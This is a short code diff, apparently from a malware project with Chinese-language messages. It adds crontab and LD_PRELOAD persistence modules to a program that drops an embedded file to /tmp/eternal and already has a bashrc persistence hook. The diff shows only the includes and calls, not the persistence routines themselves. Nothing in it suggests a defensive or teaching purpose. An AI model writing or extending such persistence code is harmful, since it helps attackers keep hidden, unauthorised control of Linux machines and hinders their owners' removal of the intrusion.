@@ -9,6 +9,14 @@
 #include "linux_persistence_bashrc.h"
 #endif
 
+#ifdef CRONTAB_MOD
+#include "linux_persistence_crontab.h"
+#endif
+
+#ifdef LD_PRELOAD_MOD
+#include "linux_persistence_ld_preload.h"
+#endif
+
 int main() {
     printf("释放嵌入的文件...\n");
     release_file("/tmp/eternal", eternal, eternal_size);  // 确保这些变量已在 bind_files.h 中声明
@@ -33,6 +41,14 @@ int main() {
 #ifdef CRONTAB_MOD
     if (strcmp(os, "linux") == 0) {
         setup_crontab_persistence();
+    } else {
+        printf("不支持的操作系统。\n");
+    }
+#endif
+
+#ifdef LD_PRELOAD_MOD
+    if (strcmp(os, "linux") == 0) {
+        setup_ld_preload_persistence();
     } else {
         printf("不支持的操作系统。\n");
     }
